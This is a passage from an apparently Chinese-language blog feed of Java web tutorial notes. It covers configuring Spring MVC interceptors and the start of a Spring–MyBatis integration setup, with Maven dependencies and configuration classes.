namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">HandlerInterceptor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ModelAndView</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Component</span><span class="token comment">//SpringMvcConfig要扫描到包</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProjectInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">HandlerInterceptor</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token comment">//被拦截之前运行代码</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">preHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"preHandle"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//false终止原始操作的运行</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token comment">//被拦截执行之后的代码</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">postHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">,</span> <span class="token class-name">ModelAndView</span> modelAndView<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"postHandle"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token comment">//被拦截操作post执行后运行的代码</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterCompletion</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">,</span> <span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"afterCompletion"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>定义配置类，继承 WebMvcConfigurationSupport，实现 addInterceptors 方法（注意：扫描加载配置） <code>@ComponentScan(&#123;&quot;com.itheima.controller&quot;,&quot;com.itheima.config&quot;&#125;)</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>controller<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span></span><span class="token class-name">ProjectInterceptor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">InterceptorRegistry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResourceHandlerRegistry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebMvcConfigurationSupport</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringMvcSupport</span> <span class="token keyword">extends</span> <span class="token class-name">WebMvcConfigurationSupport</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">ProjectInterceptor</span> projectInterceptor<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">addResourceHandlers</span><span class="token punctuation">(</span><span class="token class-name">ResourceHandlerRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        registry<span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span><span class="token string">"/pages/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token string">"/pages/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span><span class="token string">"/css/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token string">"/css/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span><span class="token string">"/js/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token string">"/js/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span><span class="token string">"/plugins/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token string">"/plugins/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>        <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">addInterceptors</span><span class="token punctuation">(</span><span class="token class-name">InterceptorRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//3.添加拦截器并设定拦截的访问路径，路径可以通过可变参数设置多个</span>        registry<span class="token punctuation">.</span><span class="token function">addInterceptor</span><span class="token punctuation">(</span>projectInterceptor<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addPathPatterns</span><span class="token punctuation">(</span><span class="token string">"/books"</span><span class="token punctuation">,</span><span class="token string">"/books/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="214-简化开发"><a class="markdownIt-Anchor" href="#214-简化开发">#</a> 21.4 简化开发</h2><ul><li><p>直接在 SpringMVCConfig 类中实现 WebMvcConfigurer 接口，可以重写 addResourceHandlers 和 addInterceptors 方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ComponentScan</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">EnableWebMvc</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">InterceptorRegistry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResourceHandlerRegistry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebMvcConfigurer</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"com.itheima.controller"</span><span class="token punctuation">,</span><span class="token string">"com.itheima.config"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@EnableWebMvc</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringMvcConfig</span> <span class="token keyword">implements</span> <span class="token class-name">WebMvcConfigurer</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addInterceptors</span><span class="token punctuation">(</span><span class="token class-name">InterceptorRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addResourceHandlers</span><span class="token punctuation">(</span><span class="token class-name">ResourceHandlerRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>缺点：侵入式较强</p></li></ul><h2 id="215-拦截器执行流程"><a class="markdownIt-Anchor" href="#215-拦截器执行流程">#</a> 21.5 拦截器执行流程</h2><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221007183049117.png" alt="image-20221007183049117"></p><h2 id="216-拦截器参数"><a class="markdownIt-Anchor" href="#216-拦截器参数">#</a> 21.6 拦截器参数</h2><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221007183444865.png" alt="image-20221007183444865"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221007183450275.png" alt="image-20221007183450275"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221007183454732.png" alt="image-20221007183454732"></p><h2 id="217-多拦截器执行顺序"><a class="markdownIt-Anchor" href="#217-多拦截器执行顺序">#</a> 21.7 多拦截器执行顺序</h2><ul><li>当配置多个拦截器时，形成拦截器链</li><li>拦截器链的运行顺序照拦截器添加顺序为准</li><li>当拦截器中出现对原始处理器的拦截，后面的拦截器均终止运行</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221007183947336.png" alt="image-20221007183947336"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-springmvc概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-springmvc概述&quot;&gt;#&lt;/a&gt; 1、SpringMVC 概述&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;SpringMVC 技术与 Servlet 技术功能等同，均属</summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>Spring整合开发</title>
    <link href="http://example.com/post/Spring%E6%95%B4%E5%90%88%E5%BC%80%E5%8F%91.html"/>
    <id>http://example.com/post/Spring%E6%95%B4%E5%90%88%E5%BC%80%E5%8F%91.html</id>
    <published>2022-10-06T14:07:13.000Z</published>
    <updated>2022-10-06T14:09:00.612Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-创建目录"><a class="markdownIt-Anchor" href="#1-创建目录">#</a> 1、创建目录</h1><ul><li><p>目录结构如下</p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221006132253415.png" alt="image-20221006132253415"></p><ul><li>config：存放配置类</li><li>controller：表现层</li><li>service：业务层</li><li>dao：持久层</li><li>domain：POJO 类</li></ul></li></ul><h1 id="2-用到的所有包坐标"><a class="markdownIt-Anchor" href="#2-用到的所有包坐标">#</a> 2、用到的所有包坐标</h1><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--    springweb--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-webmvc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.2.10.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--    spring-jdbc--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-jdbc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.2.2.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--    springtest--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.2.2.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--    mybatis--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.5.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--    spring整和mybatis--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mybatis-spring<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--    mysql--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>mysql<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mysql-connector-java<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>8.0.15<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--    德鲁伊--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>druid<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.1.16<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--    servlet--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>javax.servlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>javax.servlet-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.0.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>provided<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--    JSON--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jackson-databind<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.9.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.tomcat.maven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>tomcat7-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>80<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>path</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>path</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-整合spring"><a class="markdownIt-Anchor" href="#3-整合spring">#</a> 3、整合 Spring</h1><h2 id="31-spring配置"><a class="markdownIt-Anchor" href="#31-spring配置">#</a> 3.1 Spring 配置</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token comment">//设置该类为Spring的配置类</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"com.itheima.service"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">//扫描Spring的bean包</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="32-mybatis配置"><a class="markdownIt-Anchor" href="#32-mybatis配置">#</a> 3.2 mybatis 配置</h2><h3 id="321-jdbcproperties"><a class="markdownIt-Anchor" href="#321-jdbcproperties">#</a> 3.2.1 jdbc.properties</h3><ul><li>/resources/jdbc.properties</li></ul><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">jdbc.driver</span><span class="token punctuation">=</span><span class="token value attr-value">com.mysql.jdbc.Driver</span><span class="token key attr-name">jdbc.url</span><span 